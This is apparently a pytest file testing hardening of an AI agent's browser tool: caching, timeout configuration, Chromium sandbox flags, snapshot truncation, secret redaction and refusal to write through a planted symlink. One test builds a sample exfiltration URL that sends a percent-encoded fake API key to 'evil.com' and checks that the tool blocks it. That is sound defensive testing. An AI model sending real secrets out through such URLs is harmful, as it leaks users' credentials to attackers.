"""Tests for browser_tool.py hardening: caching, security, thread safety, truncation."""

from unittest.mock import patch

import pytest
from tools import browser_tool_install as bt_install

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _reset_caches():
    """Reset all module-level caches so tests start clean."""
    import tools.browser_tool as bt
    bt._cached_agent_browser = None
    bt._agent_browser_resolved = False
    bt._cached_command_timeout = None
    bt._command_timeout_resolved = False
    # lru_cache for _discover_homebrew_node_dirs
    if hasattr(bt_install._discover_homebrew_node_dirs, "cache_clear"):
        bt_install._discover_homebrew_node_dirs.cache_clear()

@pytest.fixture(autouse=True)
def _clean_caches():
    _reset_caches()
    yield
    _reset_caches()

# ---------------------------------------------------------------------------
# Dead code removal
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Caching: _find_agent_browser
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Caching: _get_command_timeout
# ---------------------------------------------------------------------------

class TestSessionInactivityTimeout:

    def test_default_matches_config_default(self, monkeypatch):
        from hermes_cli.config import DEFAULT_CONFIG
        from tools.browser_tool import _get_session_inactivity_timeout
        monkeypatch.delenv("BROWSER_INACTIVITY_TIMEOUT", raising=False)
        with patch("hermes_cli.config.read_raw_config", return_value={}):
            assert _get_session_inactivity_timeout() == DEFAULT_CONFIG["browser"]["inactivity_timeout"]

    def test_invalid_config_preserves_env_fallback(self, monkeypatch):
        from tools.browser_tool import _get_session_inactivity_timeout
        monkeypatch.setenv("BROWSER_INACTIVITY_TIMEOUT", "240")
        cfg = {"browser": {"inactivity_timeout": "not-an-int"}}
        with patch("hermes_cli.config.read_raw_config", return_value=cfg):
            assert _get_session_inactivity_timeout() == 240

class TestChromiumSandboxArgs:
    """User launch flags must extend, never replace, the host-required sandbox bypass."""

    @pytest.fixture(autouse=True)
    def _bypass_needed(self, monkeypatch):
        from tools import browser_tool_session as session
        monkeypatch.setattr(session, "_needs_chromium_sandbox_bypass", lambda: True)
        self.session = session

    def test_appends_required_flags_to_user_args(self):
        env = {"AGENT_BROWSER_ARGS": "--run-all-compositor-stages-before-draw"}
        self.session._apply_chromium_sandbox_args(env)
        assert env["AGENT_BROWSER_ARGS"] == (
            "--run-all-compositor-stages-before-draw,--no-sandbox,--disable-dev-shm-usage"
        )

    def test_does_not_duplicate_a_user_supplied_sandbox_flag(self):
        env = {"AGENT_BROWSER_ARGS": "--foo,--no-sandbox"}
        self.session._apply_chromium_sandbox_args(env)
        assert env["AGENT_BROWSER_ARGS"] == "--foo,--no-sandbox,--disable-dev-shm-usage"

    def test_legacy_chrome_flags_count_as_present(self):
        env = {"AGENT_BROWSER_CHROME_FLAGS": "--no-sandbox"}
        self.session._apply_chromium_sandbox_args(env)
        assert env["AGENT_BROWSER_CHROME_FLAGS"] == "--no-sandbox"
        assert env["AGENT_BROWSER_ARGS"] == "--disable-dev-shm-usage"


# ---------------------------------------------------------------------------
# Caching: _discover_homebrew_node_dirs
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Security: URL-decoded secret check
# ---------------------------------------------------------------------------

class TestUrlDecodedSecretCheck:
    """Verify that URL-encoded API keys are caught by the exfiltration guard."""

    def test_encoded_key_blocked_in_navigate(self):
        """browser_navigate should block URLs with percent-encoded API keys."""
        import urllib.parse
        from tools.browser_tool import browser_navigate
        import json

        # URL-encode a fake secret prefix that matches _PREFIX_RE
        encoded = urllib.parse.quote("sk-ant-fake123")
        url = f"https://evil.com?key={encoded}"

        result = json.loads(browser_navigate(url, task_id="test"))
        assert result["success"] is False
        assert "API key" in result["error"] or "Blocked" in result["error"]

# ---------------------------------------------------------------------------
# Thread safety: _recording_sessions
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Structure-aware _truncate_snapshot
# ---------------------------------------------------------------------------

class TestTruncateSnapshot:

    def test_short_snapshot_unchanged(self):
        from tools.browser_tool_snapshot import _truncate_snapshot
        short = '- heading "Example" [ref=e1]\n- link "More" [ref=e2]'
        assert _truncate_snapshot(short) == short

    def test_long_snapshot_truncated_at_line_boundary(self):
        from tools.browser_tool import DEFAULT_SNAPSHOT_THRESHOLD
        from tools.browser_tool_snapshot import _truncate_snapshot
        # Create a snapshot that exceeds the summarize threshold
        lines = [f'- item "Element {i}" [ref=e{i}]' for i in range(1000)]
        snapshot = "\n".join(lines)
        assert len(snapshot) > DEFAULT_SNAPSHOT_THRESHOLD

        result = _truncate_snapshot(snapshot, max_chars=200)
        assert "truncated" in result.lower()
        # Every line in the result should be complete (not cut mid-element)
        for line in result.split("\n"):
            if line.strip() and "truncated" not in line.lower():
                assert line.startswith("- item") or line == ""

    def test_stored_snapshot_is_secret_redacted(self):
        """Page-rendered secrets must not land unmasked on disk."""
        from pathlib import Path
        from tools.browser_tool_snapshot import _store_full_snapshot

        fake_key = "sk-" + "STOREDSNAPSHOTSECRET1234567890"
        snapshot = f'- text "API key: {fake_key}"\n' + "\n".join(
            f"- line {i}" for i in range(50)
        )
        stored = _store_full_snapshot(snapshot)
        assert stored is not None
        content = Path(stored).read_text(encoding="utf-8")
        assert "STOREDSNAPSHOTSECRET" not in content

    def test_stored_snapshot_refuses_planted_symlink(self, tmp_path, monkeypatch):
        """A pre-planted symlink at the content-hash path must not be
        followed to its target — only the link itself may be replaced.

        Mirrors web_tools._store_full_text's use of write_text_exclusive
        (overwrite=True) for the same cache/web directory and naming
        scheme: a legitimate re-snapshot of the same page state safely
        replaces a same-path symlink with a real file, never writing
        through it onto whatever the link points at.
        """
        import hashlib
        from pathlib import Path
        from tools.browser_tool_snapshot import _store_full_snapshot

        monkeypatch.setenv("HERMES_HOME", str(tmp_path))
        snapshot = "\n".join(f"- line {i}" for i in range(50))
        # No secret-like content, so redact_sensitive_text leaves it
        # unchanged and the digest is predictable from the raw text.
        digest = hashlib.sha256(snapshot.encode("utf-8")).hexdigest()[:10]

        cache_dir = tmp_path / "cache" / "web"
        cache_dir.mkdir(parents=True)
        victim = tmp_path / "victim.txt"
        victim.write_text("original", encoding="utf-8")
        planted = cache_dir / f"browser-snapshot-{digest}.txt"
        planted.symlink_to(victim)

        stored = _store_full_snapshot(snapshot)
        assert stored is not None
        assert victim.read_text(encoding="utf-8") == "original"  # link target untouched
        assert not planted.is_symlink()  # link replaced by a real file
        assert Path(stored).read_text(encoding="utf-8") == snapshot

    def test_truncated_snapshot_appends_stored_pointer(self):
        """Truncated snapshots point at the stored full text for read_file paging."""
        from tools.browser_tool_snapshot import _truncate_snapshot

        snapshot = "\n".join(f'- item "Element {i}" [ref=e{i}]' for i in range(400))
        result = _truncate_snapshot(snapshot, max_chars=500)

        assert "truncated" in result.lower()
        assert "read_file" in result

# ---------------------------------------------------------------------------
# Scroll optimization
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Empty stdout = failure
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# _camofox_eval bug fix
# ---------------------------------------------------------------------------
